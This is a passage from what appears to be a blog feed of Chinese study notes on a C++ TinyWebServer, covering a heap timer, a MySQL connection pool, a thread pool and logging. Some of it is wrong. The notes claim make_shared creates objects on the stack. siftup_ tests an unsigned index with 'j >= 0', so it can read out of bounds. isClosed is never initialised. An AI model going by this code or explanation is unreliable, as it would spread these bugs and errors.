class="comment">//我们需要确保树是满树，因此我们需要在vector尾部移除这一元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::del_</span><span class="params">(<span class="type">size_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(!heap_.<span class="built_in">empty</span>() &amp;&amp; index &gt;= <span class="number">0</span> &amp;&amp; index&lt; heap_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> i = index;</span><br><span class="line">    <span class="type">size_t</span> n = heap_.<span class="built_in">size</span>()- <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">assert</span>(i&lt;=n);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i &lt; n) &#123;</span><br><span class="line">        <span class="built_in">SwapNode_</span>(i, n);</span><br><span class="line">          <span class="comment">//因为节点n的时间肯定是大于等于i的，所以不会将n处要删除的节点替换掉</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">siftdown_</span>(i, n)) &#123;</span><br><span class="line">            <span class="built_in">siftup_</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 队尾元素删除 */</span></span><br><span class="line">    ref_.<span class="built_in">erase</span>(heap_.<span class="built_in">back</span>().id);</span><br><span class="line">    heap_.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向上调整</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::siftup_</span><span class="params">(<span class="type">size_t</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(i &gt;= <span class="number">0</span> &amp;&amp; i &lt; heap_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> j = (i<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(j &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(heap_[i] &gt; heap_[j]) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">SwapNode_</span>(i, j);</span><br><span class="line">        i = j;</span><br><span class="line">        j = (i<span class="number">-1</span>) /<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//向下调整</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">HeapTimer::siftdown_</span><span class="params">(<span class="type">size_t</span> index, <span class="type">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; heap_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">assert</span>(n &gt;= <span class="number">0</span> &amp;&amp; n &lt;= heap_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="type">size_t</span> i = index;</span><br><span class="line">    <span class="type">size_t</span> j = <span class="number">2</span>*i + <span class="number">1</span>;    <span class="comment">//左节点</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(j &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(j<span class="number">+1</span> &lt; n &amp;&amp; heap_[j<span class="number">+1</span>] &lt; heap_[j]) j++;   <span class="comment">//比较左右节点</span></span><br><span class="line">        <span class="keyword">if</span>(heap_[i] &lt; heap_[j]) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">SwapNode_</span>(i,j);</span><br><span class="line">        i = j;</span><br><span class="line">        j = <span class="number">2</span>*i + <span class="number">1</span>;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> i &gt; index; <span class="comment">//返回是否交换节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapTimer::SwapNode_</span><span class="params">(<span class="type">size_t</span> i, <span class="type">size_t</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(i &gt;= <span class="number">0</span> &amp;&amp; i &lt; heap_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">assert</span>(j &gt;= <span class="number">0</span> &amp;&amp; j &lt; heap_.<span class="built_in">size</span>());</span><br><span class="line">    std::<span class="built_in">swap</span>(heap_[i],heap_[j]);</span><br><span class="line">    <span class="comment">//i，j在heap_的位置已经变化</span></span><br><span class="line">    ref_[heap_[i].id] = i;</span><br><span class="line">    ref_[heap_[j].id] = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer pool</title>
      <link href="/2024/05/04/TinyWebServer/0x4pool/"/>
      <url>/2024/05/04/TinyWebServer/0x4pool/</url>
      
        <content type="html"><![CDATA[<h1 id="pool"><a href="#pool" class="headerlink" title="pool"></a>pool</h1><p>包括了<code>sql</code>连接池和执行任务的<code>线程</code>池。</p><h3 id="SqlConnRAII"><a href="#SqlConnRAII" class="headerlink" title="SqlConnRAII"></a>SqlConnRAII</h3><p>这里使用RAII来管理和获取pool池资源，使得在构造时获取资源，在析构时释放资源。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SQLCONNRAII_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SQLCONNRAII_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sqlconnpool.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SqlConnRAII</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">SqlConnRAII</span>(MYSQL **sql, SqlConnPool *connPool) &#123;</span><br><span class="line">    <span class="built_in">assert</span>(connPool);</span><br><span class="line">    <span class="comment">//不能直接将指针赋值给另一个指针，因为指针本身就是一个值，而不是一个引用。</span></span><br><span class="line">    *sql = connPool-&gt;<span class="built_in">GetConn</span>();</span><br><span class="line">    sql_ = *sql;</span><br><span class="line">    connpool_ = connPool;</span><br><span class="line">  &#125;</span><br><span class="line">  ~<span class="built_in">SqlConnRAII</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (sql_) &#123;</span><br><span class="line">      connpool_-&gt;<span class="built_in">FreeConn</span>(sql_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  MYSQL *sql_;</span><br><span class="line">  SqlConnPool *connpool_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="SqlConnpool-h"><a href="#SqlConnpool-h" class="headerlink" title="SqlConnpool.h"></a>SqlConnpool.h</h3><p>这里的单例模式保证只有一个sql连接队列。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SQLCONNPOOL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SQLCONNPOOL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span> <span class="comment">//POSIX信号量库</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SqlConnPool</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> SqlConnPool *<span class="title">Instance</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">MYSQL *<span class="title">GetConn</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">FreeConn</span><span class="params">(MYSQL *conn)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetFreeConnCount</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *host, <span class="type">int</span> port, <span class="type">const</span> <span class="type">char</span> *user, <span class="type">const</span> <span class="type">char</span> *pwd,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="type">const</span> <span class="type">char</span> *dbName, <span class="type">int</span> connSize)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">ClosePool</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">SqlConnPool</span>();</span><br><span class="line">  ~<span class="built_in">SqlConnPool</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> MAX_CONN_;</span><br><span class="line">  <span class="type">int</span> useCount_;</span><br><span class="line">  <span class="type">int</span> freeCount_;</span><br><span class="line"></span><br><span class="line">  std::queue&lt;MYSQL *&gt; connQue_;</span><br><span class="line">  std::mutex mtx_;</span><br><span class="line">  <span class="type">sem_t</span> semId_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="SqlConnpool-cpp"><a href="#SqlConnpool-cpp" class="headerlink" title="SqlConnpool.cpp"></a>SqlConnpool.cpp</h3><p>因为DB操作往往较慢，且频繁连接与断开数据库池不仅会引起大量开销，还可能引发异常。因此这次我们采用队列来建立数据库连接池。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sqlconnpool.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">SqlConnPool *<span class="title">SqlConnPool::Instance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> SqlConnPool connPool;</span><br><span class="line">  <span class="keyword">return</span> &amp;connPool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">MYSQL *<span class="title">SqlConnPool::GetConn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  MYSQL *sql = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (connQue_.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;SqlConnPool busy!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sem_wait</span>(&amp;semId_);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">    sql = connQue_.<span class="built_in">front</span>();</span><br><span class="line">    connQue_.<span class="built_in">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SqlConnPool::FreeConn</span><span class="params">(MYSQL *conn)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(conn);</span><br><span class="line">  <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">  connQue_.<span class="built_in">push</span>(conn);</span><br><span class="line">  <span class="built_in">sem_post</span>(&amp;semId_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SqlConnPool::GetFreeConnCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> connQue_.<span class="built_in">size</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SqlConnPool::Init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *host, <span class="type">int</span> port, <span class="type">const</span> <span class="type">char</span> *user,</span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">const</span> <span class="type">char</span> *pwd, <span class="type">const</span> <span class="type">char</span> *dbName, <span class="type">int</span> connSize = <span class="number">10</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(connSize &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; connSize; i++) &#123;</span><br><span class="line">    MYSQL *sql = <span class="literal">nullptr</span>;</span><br><span class="line">    sql = <span class="built_in">mysql_init</span>(sql);</span><br><span class="line">    <span class="keyword">if</span> (!sql) &#123;</span><br><span class="line">      <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;MySql init error!&quot;</span>);</span><br><span class="line">      <span class="built_in">assert</span>(sql); <span class="comment">//因为无法初始化就无法正常执行数据库连接，因此需要输出错误位置结束程序</span></span><br><span class="line">    &#125;</span><br><span class="line">    sql = <span class="built_in">mysql_real_connect</span>(sql, host, user, pwd, dbName, port, <span class="literal">nullptr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!sql) &#123;</span><br><span class="line">      <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;MySql Connect error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    connQue_.<span class="built_in">push</span>(sql);</span><br><span class="line">  &#125;</span><br><span class="line">  MAX_CONN_ = connSize;</span><br><span class="line">  <span class="built_in">sem_init</span>(&amp;semId_, <span class="number">0</span>, MAX_CONN_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SqlConnPool::ClosePool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(mtx_)</span></span>;</span><br><span class="line">  <span class="keyword">while</span> (!connQue_.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    <span class="keyword">auto</span> item = connQue_.<span class="built_in">front</span>();</span><br><span class="line">    connQue_.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">mysql_close</span>(item);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">mysql_library_end</span>(); <span class="comment">//释放mysql资源，防止内存泄露</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SqlConnPool::<span class="built_in">SqlConnPool</span>() : <span class="built_in">useCount_</span>(<span class="number">0</span>), <span class="built_in">freeCount_</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">SqlConnPool::~<span class="built_in">SqlConnPool</span>() &#123; <span class="built_in">ClosePool</span>(); &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="threadpool-cpp"><a href="#threadpool-cpp" class="headerlink" title="threadpool.cpp"></a>threadpool.cpp</h3><ul><li><p>主线程通过将读写的操作交由线程来提升效率。</p></li><li><p><strong>make_shared</strong>和<strong>shared_ptr</strong>的区别</p><ul><li><p><code>make_shared</code> 通常更高效，因为它减少了内存分配的次数。</p></li><li><p><code>make_shared</code> 提供了异常安全的保障，当构造对象和 <code>shared_ptr</code> 的过程中抛出异常时，不会产生内存泄漏。</p></li><li><p><code>shared_ptr</code> 可以管理任何动态分配的内存，而 <code>make_shared</code> 用于在栈上自动创建对象。</p></li><li><p>使用 <code>shared_ptr</code> 时，可以更灵活地选择内存分配器和自定义删除器，而 <code>make_shared</code> 则没有这些灵活性。</p></li></ul></li><li><p>这里我们通过使用<code>移动语义</code>来避免复制操作，这篇文章详细解释了什么是<code>万能引用</code>以及<code>完美转发</code>是如何实现与<code>万能引用</code>的联动<a href="https://zhuanlan.zhihu.com/p/50816420">引用折叠和完美转发 - 知乎 (zhihu.com)</a>。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> THREADPOOL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREADPOOL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;condition_variable&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadPool</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">ThreadPool</span><span class="params">(<span class="type">size_t</span> threadCount = <span class="number">8</span>)</span></span></span><br><span class="line"><span class="function">      : pool_(std::make_shared&lt;Pool&gt;()) &#123;</span></span><br><span class="line">    <span class="built_in">assert</span>(threadCount &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; threadCount; i++) &#123;</span><br><span class="line">      std::<span class="built_in">thread</span>([pool = pool_] &#123;</span><br><span class="line">        std::unique_lock&lt;std::mutex&gt; <span class="built_in">locker</span>(pool-&gt;mtx);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!pool-&gt;tasks.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> task = std::<span class="built_in">move</span>(pool-&gt;tasks.<span class="built_in">front</span>());</span><br><span class="line">            pool-&gt;tasks.<span class="built_in">pop</span>();</span><br><span class="line">            locker.<span class="built_in">unlock</span>();</span><br><span class="line">            <span class="built_in">task</span>();</span><br><span class="line">            locker.<span class="built_in">lock</span>();</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pool-&gt;isClosed)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            pool-&gt;cond.<span class="built_in">wait</span>(locker);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).<span class="built_in">detach</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//生成默认构造函数和移动构造函数</span></span><br><span class="line">  <span class="built_in">ThreadPool</span>() = <span class="keyword">default</span>;</span><br><span class="line">  <span class="built_in">ThreadPool</span>(ThreadPool &amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">  ~<span class="built_in">ThreadPool</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> (pool_ != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(pool_-&gt;mtx)</span></span>;</span><br><span class="line">      pool_-&gt;isClosed = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pool_-&gt;cond.<span class="built_in">notify_all</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">F</span>&gt; <span class="function"><span class="type">void</span> <span class="title">AddTask</span><span class="params">(F &amp;&amp;task)</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">locker</span><span class="params">(pool_-&gt;mtx)</span></span>;</span><br><span class="line">      pool_-&gt;tasks.<span class="built_in">emplace</span>(std::forward&lt;F&gt;(task));</span><br><span class="line">    &#125;</span><br><span class="line">    pool_-&gt;cond.<span class="built_in">notify_one</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Pool</span> &#123;</span><br><span class="line">    std::mutex mtx;</span><br><span class="line">    std::condition_variable cond;</span><br><span class="line">    <span class="type">bool</span> isClosed;</span><br><span class="line">    std::queue&lt;std::function&lt;<span class="type">void</span>()&gt;&gt; tasks;</span><br><span class="line">  &#125;;</span><br><span class="line">  std::shared_ptr&lt;Pool&gt; pool_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer Log</title>
      <link href="/2024/05/03/TinyWebServer/0x3Log/"/>
      <url>/2024/05/03/TinyWebServer/0x3Log/</url>
      
        <content type="html"><![CDATA[<h1 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h1><p>日志系统是各大项目的基石，可以帮我们进行调试、错误定位。当然，看着日志系统产生一行行输出也是一种享受。</p><p>今天发现代码补全有点问题，经过一番搜索，发现在<code>wsl2</code>上使用<code>clangd</code>比自带的补全强多了，强推(虽然最后发现是模板写错了)！</p><h3 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h3><ul><li><p><strong>同步变量</strong>：</p><ul><li>线程在某些条件得到满足之前挂起</li><li>notify_one：随机选择一个线程唤醒。</li><li>notify_all：唤醒所有在条件变量上等待的线程，可能会引起<code>惊群效应</code>。</li></ul></li><li><p><strong>互斥锁:</strong>防止多个线程同时访问共享资源。</p></li><li><p><strong><a href="https://blog.csdn.net/A_L_A_N/article/details/115051108">C++11多线程之互斥量(mutex)与条件变量(condition_variable)_c++ 条件变量和互斥-CSDN博客</a> </strong></p></li><li><p><strong>生产者消费者模型：</strong>生产者线程通过 <code>push_back</code> 和 <code>push_front</code> 向队列中添加元素，消费者线程通过 <code>pop</code> 从队列中取出元素。条件变量的使用确保了生产者在队列已满时会等待，消费者在队列为空时会等待，并且在有元素可取时唤醒。</p></li><li><p><strong>模板：</strong>通过使用模板在编译时生成代码，使得各种数据结构都能使用该阻塞队列。</p></li><li><p><strong>阻塞队列</strong>是一种非常有用的工具，它可以简化生产者-消费者模式的实现，提高系统资源的利用率，并实现线程同步。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 